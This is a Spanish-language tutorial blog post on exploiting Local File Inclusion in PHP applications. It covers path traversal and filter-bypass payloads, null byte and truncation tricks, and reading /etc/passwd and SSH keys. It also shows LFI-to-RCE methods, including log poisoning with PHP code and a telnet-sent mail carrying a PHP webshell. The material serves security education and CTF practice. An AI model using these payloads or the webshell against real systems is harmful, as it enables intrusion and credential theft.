---
id: "como-explotar-un-local-file-inclusion"
title: "Cómo explotar un Local File Inclusion (LFI)"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2022-02-07
updatedDate: 2022-02-07
image: "https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-0.webp"
description: "Guía completa sobre la vulnerabilidad LFI: técnicas de explotación, bypasses y métodos para convertir un Local File Inclusion en ejecución remota de comandos."
categories:
  - "web"
draft: false
featured: false
lang: "es"
---

Un Local File Inclusion (LFI) es una vulnerabilidad web que permite la lectura de archivos locales. Esta vulnerabilidad ocurre cuando un servidor web usa la ruta del archivo como input. Además, puede derivar en una ejecución remota de comandos si se cumplen ciertos requisitos.

- [LFI Básico](#lfi-básico)
- [Directory Path Traversal](#directory-path-traversal)
- [Null Byte](#null-byte)
- [Path Truncation](#path-truncation)
- [LFI a RCE](#lfi-a-rce)
    - [Log Poisoning](#log-poisoning)
    - [Mail PHP Execution](#mail-php-execution)
    - [/proc/self/environ](#procselfenviron)
    - [/proc/self/fd ó /dev/fd](#procselffd-ó-devfd)
    - [PHP Sessions](#php-sessions)
- [Conclusión LFI a RCE](#conclusión-lfi-a-rce)
- [Referencias](#referencias)

## LFI Básico

Como se ha dicho al principio, el LFI ocurre cuando mediante un campo de entrada se está llamando a la ruta de un archivo local. Típicamente, esta situación la veremos en variables de PHP, pero no hay que limitar la vulnerabilidad a esto porque sería erróneo.

Para que quede más claro la idea, vamos a verlo con un ejemplo. Tenemos el siguiente código en PHP:

![Código PHP vulnerable a LFI básico](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-1.avif)

Es un código sencillo donde se espera un valor a través de una petición GET en la variable `file`. Posteriormente, se comprueba si la variable `file` tiene algún contenido, y, en el caso de que si, se incluye el archivo que tenga como nombre, el valor de la variable.

Para alojar el archivo, nos montamos un servidor web:

![Servidor web local con PHP](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-2.avif)

De esta forma, cuando se acceda a `http://localhost` cargará el archivo:

![Acceso al servidor sin especificar archivo](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-3.avif)

> Recordemos que cuando accedemos a un recurso web sin especificar archivo. Por defecto se intenta cargar el `index.html` o el `index.php`, por eso no se especifica archivo arriba, no hace falta.

En este caso no vemos nada, porque sencillamente no le hemos especificado nada en la variable `file` que existe en el código PHP. Ahora bien, si definimos la variable y le pasamos como valor por ejemplo, el archivo `/etc/hosts`:

![Lectura del archivo /etc/hosts mediante LFI](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-4.avif)

Conseguimos verlo, estamos consiguiendo una inclusión de archivos locales (LFI). Para un formato más legible podemos verlo desde el código fuente (`Ctrl + U`):

![Código fuente mostrando el contenido del archivo](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-5.avif)

Con esto, ya podríamos enumerar archivos sensibles del sistema (ej: archivos de configuración) y obtener información del mismo.

> Por ejemplo, algo típico de hacer sobre todo en CTFs es ver los usuarios del sistema en el `/etc/passwd` y comprobar si tienen alguna `id_rsa` en el directorio `/home/<usuario>/.ssh/id_rsa`

Este es el tipo de LFI más básico, ya que en el código PHP no estamos haciendo ningún tipo de sanitización del input. Existen ciertas protecciones para que no sea tan sencillo lograr el Local File Inclusion, sin embargo, así mismo, existen diversas técnicas y bypasses para que consigamos el LFI.

## Directory Path Traversal

Vamos a cambiar el código PHP al siguiente:

![Código PHP con restricción de directorio](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-6.avif)

Ahora, cuando se intente incluir un archivo, el propio código PHP le añadirá la ruta de `/var/www/html` con el propósito de que solo se puedan incluir archivos que estén dentro de esta ruta.

Al contrario que antes, ahora tenemos una protección que parece impedirnos el cargar archivos que estén fuera del directorio que especifica el código, sin embargo, esta protección se puede bypasear de forma muy sencilla usando un Directory Path Traversal.

Un Directory Path Traversal es una técnica que permite que nos escapemos de la ruta a la que se nos está intentando obligar que permanezcamos. Esta técnica se lleva a cabo a través del uso de dot-dot-slash, dicho de otra forma, de `../`.

Por ejemplo, vamos a intentar cargar el archivo `/etc/hosts` de la misma forma que hemos hecho antes:

![Intento fallido de lectura sin path traversal](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-7.avif)

Esta vez no carga porque se está intentando incluir el archivo `/var/www/html/etc/hosts`, el cual no existe. Sin embargo, si intentamos de hacer uso del Directory Path Traversal, ocurrirá lo siguiente:

![Bypass exitoso usando path traversal](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-8.avif)

Podemos leerlo, y esto ocurre porque se está intentando cargar el archivo:
- `/var/www/html/../../../../../../../../../../../../etc/hosts`

El cual si existe. Un detalle de esto, es que no necesitamos saber cuantos directorios exactamente necesitamos ir hacia atrás para llegar a la raíz. Porque, podemos ir hacia atrás ilimitadamente, ya que, cuando lleguemos a la raíz, simplemente se quedará ahí por mucho que sigamos intentando ir hacia atrás. Este comportamiento ocurre igual en Linux:

![Comando pwd mostrando el directorio actual](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-9.avif)

![Navegación hacia atrás en el sistema de archivos](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-10.avif)

Con este último ejemplo, si en el código PHP en vez de `/var/www/html/`, fuese `/var/www/html` (sin el slash al final). El payload de arriba:

- `../../../../../../../../../../../../etc/hosts`

No funcionaría porque quedaría tal que:
- `/var/www/html../../../../../../../../../../../../etc/hosts`

Por lo que al payload simplemente habría que añadirle un slash al principio para que quedase tal que:
- `/../../../../../../../../../../../../etc/hosts`

Y en conjunto:
- `/var/www/html/../../../../../../../../../../../../etc/hosts`

Es un mini cambio, pero puede determinar que nos funcione o no.

Aparte de esto, que ocurre si en el código PHP añadimos una sanitización para que elimine la cadena `../` del valor que entre por la variable `file`. El código PHP sería el siguiente:

![Código PHP con sanitización básica](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-11.avif)

Si intentamos lo mismo que antes:

![Intento fallido por la sanitización](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-12.avif)

No funcionará, ya que nos está cambiando nuestro input de:
- `/var/www/html/../../../../../../../../../../../../etc/hosts`

A:
- `/var/www/html/etc/hosts`

Y sabemos que ese archivo no existe. ¿Qué podemos hacer entonces?

Pues lo que podemos hacer es intentar que en vez de que intente acceder al archivo:
- `/var/www/html/../../../../../../../../../../../../etc/hosts`

Intente acceder a:
- `/var/www/html/….//….//….//….//….//….//….//….//….//….//….//….//etc/hosts`

Ya que cuando haga la sanitización y quite los valores que coincidan con `../`, se nos quedará la ruta:
- `/var/www/html/../../../../../../../../../../../../etc/hosts`

Y podremos acceder de nuevo:

![Bypass de la sanitización usando doble encoding](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-13.avif)

> También sería lo mismo si en vez de `....//` fuese `..././`. Sabiendo esto, uno ya se puede atrever incluso a mezclar ambos payloads

De esta forma, vemos que a pesar de las distintas sanitizaciones, conseguimos leer el archivo. También se podría llegar a colocar los símbolos usando URL Encode, doble URL Encode.

Al final de todo, es ir preguntándonos ¿Y si pongo esto, y si lo hago de esta forma? Es cuestión de echar creatividad.

## Null Byte

El Null Byte es una técnica que funcionaba hasta la versión 5.3.4 de PHP (lo arreglaron en esta versión). Esta técnica permitía que no se tuviera en cuenta cualquier cosa que en el código PHP se añadiese después de la variable PHP que nosotros establecemos.

En un código PHP se nos puede añadir un string al final con el propósito de que a la hora de incluir archivos, solo se incluyan archivos que acaben en el string que se indique, por ejemplo:

![Código PHP que añade extensión .php](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-14.avif)

En este caso, se añade la cadena `.php` para que solo se puedan leer archivos que acaben en esta extensión. Si intentásemos acceder al `/etc/hosts`, se nos convertiría en `/etc/hosts.php`, por lo tanto, ya no podríamos leerlo.

Pues usar un Null Byte hacía que se bypaseara este impedimento. La idea básicamente era colocar al final de nuestro input, un `%00`.

Esto ocasionaba que se ignorase todo lo que se añadiese después. Por lo que nosotros pasaríamos a la variable file un input como:
- `/var/www/html/….//….//….//….//….//….//….//….//….//….//….//….//etc/hosts%00`

Para qué además de bypasear todas las protecciones anteriormente vistas, se ignorase por completo lo que se añadiese después de la variable gracias al Null Byte.

Esta técnica al fin y al cabo ya se solucionó, por lo que es poco probable que nos la encontremos.

## Path Truncation

Path Truncation es otra técnica para conseguir el mismo propósito que Null Byte, ignorar toda cadena que se sitúe después de la variable.

Esta técnica también se parcheó en su momento. En concreto se corrigió en la versión 5.3 de PHP. Aun así, no está de mal conocerla. Path Truncation se basa en que nos aprovechamos del límite de 4096 bytes que tiene PHP para un string.

Conociendo este límite, si en el código PHP se nos añade una extensión después del archivo. ¿Qué ocurre si nosotros mandamos como valor en la variable una cadena mayor a 4096 bytes?

PHP tendrá que cortar la cadena e ignorar lo que se sitúe después de estos bytes, por lo que la idea sería:
- `/etc/hosts[+4096 bytes]`

De esta forma, cuando PHP "corte" la cadena, ignorará los bytes sobrantes que hayamos añadido además de la extensión que el mismo código añade posteriormente.

Eso si, hace falta una serie de requisitos para que funcione:
- El dato que nosotros le pasamos a la variable, debe empezar con un string o letra random
- El archivo/ruta que nosotros indiquemos tiene que tener un número de caracteres impar. Para ello, nos aprovechamos de la condición de arriba.
- El byte 4096 debe de ser un punto, esto también se consigue con la primera condición

Teniendo en cuenta estas tres condiciones, el payload debe de ser algo como:
- `a/../etc/hosts/./././.` hasta sobrepasar 4096 bytes.

Podemos probar la vulnerabilidad en el [reto Path Truncation de Root Me](https://www.root-me.org/es/Desafios/Web-Servidor/Path-Truncation).

Esto funciona porque:
- `/etc/hosts` es equivalente a `/etc/hosts/.` (etc)

Ejemplo:

![Equivalencia entre rutas con y sin punto](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-15.avif)

En este caso no estoy añadiendo ninguna extensión en el código, simplemente muestro como el colocar un `/.` es indiferente a no colocarlo en el sentido de que se nos seguirá cargando el archivo. Eso si, el carácter "random" inicial es obligatorio, ya que, si no, no funcionará:

![Error sin carácter inicial](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-16.avif)

Porque establece que el número de caracteres de la ruta sea par o impar, y, con ello, que el byte 4096 sea un `slash (/)` o un `punto (.)`. En este caso, sería lo mismo colocar una `a` que colocar 3, 5, etc, mientras que siempre sea un número impar.

Pd: podemos generar los 4096 bytes con el siguiente comando:

![Comando para generar 4096 bytes](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-17.avif)

## LFI a RCE

Hay muchas formas de convertir un LFI en un RCE (Remote Command Execution):

### Log Poisoning

El más típico es el Log Poisoning. Como podemos leer archivos mediante el LFI, ¿qué ocurre si leemos un archivo con código PHP?

Básicamente, se interpretará. Ahora bien, si nosotros podemos controlar el contenido del código PHP podremos ejecutar lo que queramos. Eso si, ¿cómo escribimos el código que queramos en un archivo del sistema? Pues aquí es donde entran como protagonista los logs.

Cuando por ejemplo, intentamos hacer login en SSH, los intentos de inicio de sesión se almacenan en este caso en el archivo `/var/log/auth.log`:

![Contenido del log auth.log](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-18.avif)

Por lo que, ¿qué ocurre si intento iniciar sesión con un usuario de nombre `<?php system("whoami"); ?>` ?:

![Inyección de código PHP en el log](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-19.avif)

También se escribe en el archivo. Si yo leyese ahora este archivo mediante un LFI, debería de ejecutarse el código PHP:

![Ejecución del comando whoami mediante LFI](https://cdn.deephacking.tech/i/posts/como-explotar-un-local-file-inclusion/como-explotar-un-local-file-inclusion-20.avif)

Efectivamente, en el mismo sitio donde está escrito el comando, a la hora de verlo desde el navegador, se ha interpretado y nos ha ejecutado el comando `whoami`.

La idea del log poisoning es básicamente esta. Hay ciertos archivos que nosotros estando desde fuera de la máquina, podemos controlar su contenido. Y si tenemos un LFI y podemos controlar el contenido de un archivo legible, pues tenemos RCE.

El log de SSH (`/var/log/auth.log`) no es el único, otros archivos típicos que nos pueden servir son:
- Log de apache --> `/var/log/apache2/access.log`
- Log de vsftpd --> `/var/log/vsftpd.log`
- Cualquier otro archivo o log donde podamos controlar el contenido desde fuera.

> Nota: a veces, si vemos muy difícil insertar un comando por la cantidad de símbolos o comillas que puede llegar a tener, no olvidemos que podemos encodearlo en base64 y ejecutar: `base64 | base64 -d | bash`
> 
> Quizás de esta forma podemos llegar a tener menos problemas a la hora de insertar un comando en un log.

> Otra cosa importante a destacar es que tenemos que tener mucho cuidado a la hora de insertar el código PHP en el log. Ya que si nos equivocamos, el log no nos cargará y entonces tendremos que eliminar el código PHP erróneo para que podamos volver a leer el archivo (es aquí cuando se dice que "hemos arruinado el registro"). Y claro, si nos ha sucedido en una máquina remota, pues F.

### Mail PHP Execution

Otra posible forma de conseguir RCE es a través de un email. Los emails recibidos por un usuario se almacenan en la ruta:
- `/var/mail/<usuario>`

Por lo que, si la máquina tiene el puerto 25 abierto (SMTP). Podemos enviar por ejemplo vía telnet, un correo que contenga código PHP al usuario que queramos y posteriormente leer el correo mediante el LFI para que se interprete el código mandado en el correo.

Podemos enviar un correo con telnet de la siguiente forma:

```bash
telnet X.X.X.X 25

HELO localhost

MAIL FROM:<root> #Sin los simbolos de < o >

RCPT TO:<www-data> #Sin los simbolos de < o >

DATA

<?php

echo shell_exec($_REQUEST['cmd']); # Webshell

?>

Para señalar que hemos terminado de escribir el email, presionamos dos veces enter, escribimos un . y de nuevo enter
```

Con el correo enviado, si por ejemplo, lo hemos enviado al usuario www-data, deberíamos de encontrar el correo en el archivo:
- `/var/mail/www-data`

Suponiendo que haya llegado, como hemos enviado una webshell, mediante el LFI podríamos ejecutar comandos de la siguiente forma (ejemplo):
- `/index.php?file=/var/mail/www-data&cmd=<comando>`

> Recordemos que si estamos concatenando variables en php, la primera siempre es con una interrogación (`?`), sin embargo, todas las siguientes se concatenan con un ampersand (`&`)

Otros archivos a comprobar si el de arriba no existe son:
- `/var/log/mail.log`
- `/var/log/maillog`
- `/var/adm/maillog`
- `/var/adm/syslog/mail.log`

### /proc/self/environ

El archivo `/proc/self/environ` contiene múltiples variables de entorno, entre ellas, una que nos puede interesar es `HTTP_USER_AGENT` (en el caso de que esté). El valor de esta variable de entorno dependerá del User-Agent por el cual nosotros estemos accediendo al servidor web. Por lo que si este archivo es legible, podemos conseguir RCE simplemente cambiando nuestro User-Agent al código PHP que queramos.

En exploit-db hay un [PoC sobre shell via LFI - proc/self/environ method](https://www.exploit-db.com/papers/12886) que explica bastante bien esto.

### /proc/self/fd ó /dev/fd

Dentro de los directorios ya sea `/proc/self/fd/` o `/dev/fd/` podemos encontrar ciertos archivos con la siguiente estructura:
- `/proc/self/fd/x`
- `/dev/fd/x`

Siendo x un número.

Estos archivos están directamente relacionados con algunos procesos y registros del sistema. Por lo que quizás, uno de estos archivos puede que nos muestre información del servidor web al que estamos accediendo, y, con ello, algún campo que sea editable por nosotros.

[Este post sobre BugBounty: from LFI to RCE](https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899) explica bastante bien esto, además, en un caso real de Bug Bounty.

### PHP Sessions

Este otro método es bastante curioso y que podemos ver con un ejemplo en el [artículo From LFI to RCE via PHP Sessions](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/). Cuando el servidor nos proporciona una cookie de sesión PHPSESSID, esta, se almacena en el sistema, normalmente en una ruta como:
- `/var/lib/php/sessions/`

U otra parecida. Y con nombre: `sess_<PHPSESSID>`

> La ruta de almacenamiento de las cookies de sesión la determina la variable de entorno `session.save_path`, la cual por defecto está vacía

Por lo que la ruta completa sería:
- `/var/lib/php/sessions/sess_<PHPSESSID>`

Si somos capaces de acceder y leer el archivo de la sesión mediante el LFI. Podemos encontrarnos campos que quizás podemos manipular y cambiar su valor a un código PHP.

## Conclusión LFI a RCE

Hemos visto muchas posibles técnicas arribas, pero realmente, al final, el objetivo con cada una de ellas es llegar a leer un código PHP mediante el LFI que tenemos. Por lo que, aunque conocer las técnicas mencionadas nos puede venir super bien. Es nuestra misión analizar el caso concreto en el que nos encontramos y ver en que archivo podemos llegar a controlar su contenido para, mediante el LFI, leerlo y obtener RCE.

> OJO, no cometamos el fallo mencionado al principio de limitar el LFI a PHP, lo importante es quedarnos con el concepto de la vulnerabilidad. Ya que por ejemplo, en un IIS, podemos hacer lo mismo, pero en vez de con archivos PHP, con ASPX o ASP.

## Referencias

- [EXPLOITING PHP PATH TRUNCATION - PHP menor a 5.3](https://jbedelsec.wordpress.com/2018/12/11/exploiting-php-file-truncation-php-5-3/)
- [Local File Inclusion (LFI) - Aptive](https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/#Local-File-Inclusion-LFI)
- [How can I use this path bypass/exploit Local File Inclusion?](https://security.stackexchange.com/questions/17407/how-can-i-use-this-path-bypass-exploit-local-file-inclusion)
- [RCE via LFI Log Poisoning - The Death Potion](https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d)
- [BugBounty: Journey from LFI to RCE - InfoSec Write-ups](https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
